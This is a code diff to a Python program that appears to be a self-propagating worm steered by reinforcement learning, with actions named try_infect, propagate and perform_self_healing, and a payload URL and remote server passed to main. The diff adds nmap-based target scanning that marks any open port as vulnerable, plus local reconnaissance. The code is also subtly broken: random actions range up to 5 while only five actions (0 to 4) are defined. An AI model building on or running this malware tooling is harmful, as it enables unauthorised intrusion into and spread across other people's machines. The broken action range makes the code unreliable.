@@ -12,6 +12,8 @@ import numpy as np
 import psutil
 import signal
 import pickle
+import socket
+import nmap
 
 class State(NamedTuple):
     ip: str
@@ -56,7 +58,7 @@ def choose_action(q_table: Dict[State, Dict[int, float]], state: State, explorat
         return symbolic_action
 
     if np.random.rand() < exploration_probability:
-        return np.random.randint(0, 4)
+        return np.random.randint(0, 6)
     else:
         return max(q_table[state].items(), key=lambda x: x[1])[0]
 
@@ -66,7 +68,8 @@ def take_action(action: int, ip: str) -> Tuple[Optional[float], Optional[State]]
         0: try_infect,
         1: perform_self_healing,
         2: propagate,
-        3: check_self_awareness
+        3: check_self_awareness,
+        4: explore_environment,
     }
     
     result = action_map[action](ip)
@@ -126,7 +129,13 @@ def propagate(ip_range: List[str]) -> bool:
 
 def is_vulnerable(ip: str) -> bool:
     """Check whether the target machine is vulnerable to a specific exploit."""
-    # Placeholder for the vulnerability check logic
+    nm = nmap.PortScanner()
+    scan_result = nm.scan(ip, '22-443')
+    for host in nm.all_hosts():
+        if 'tcp' in nm[host]:
+            for port in nm[host]['tcp']:
+                if nm[host]['tcp'][port]['state'] == 'open':
+                    return True
     return False
 
 def check_self_awareness(ip: str) -> bool:
@@ -139,6 +148,24 @@ def check_self_awareness(ip: str) -> bool:
     except Exception as e:
         return False
 
+def explore_environment(ip: str) -> bool:
+    """Explore the environment to gather information about the system."""
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        open_ports = []
+        nm = nmap.PortScanner()
+        scan_result = nm.scan(local_ip, '1-1024')
+        for host in nm.all_hosts():
+            if 'tcp' in nm[host]:
+                for port in nm[host]['tcp']:
+                    if nm[host]['tcp'][port]['state'] == 'open':
+                        open_ports.append(port)
+        if open_ports:
+            return True
+    except Exception as e:
+        return False
+
 def update_state(state: State, action: int) -> State:
     """Update the current state based on the action taken."""
     state_updates = {
@@ -146,6 +173,7 @@ def update_state(state: State, action: int) -> State:
         1: lambda s: State(s.ip, s.state_number - 1),
         2: lambda s: State(s.ip, s.state_number * 2),
         3: lambda s: State(s.ip, s.state_number // 2),
+        4: lambda s: State(s.ip, s.state_number + 5),
     }
     return state_updates.get(action, lambda s: s)(state)
 
@@ -162,7 +190,7 @@ def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
     return sorted(ip_range, key=lambda ip: int(ip.split('.')[-1]))  # Simple heuristic: sort by last octet
 
 def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -> None:
-    q_table: Dict[State, Dict[int, float]] = {State(ip, state_number): {action: 0.0 for action in range(4)} for ip in ip_range for state_number in range(MAX_STATE)}
+    q_table: Dict[State, Dict[int, float]] = {State(ip, state_number): {action: 0.0 for action in range(5)} for ip in ip_range for state_number in range(MAX_STATE)}
     state = State(ip_range[0], 0)
 
     exploration_probability = 1.0
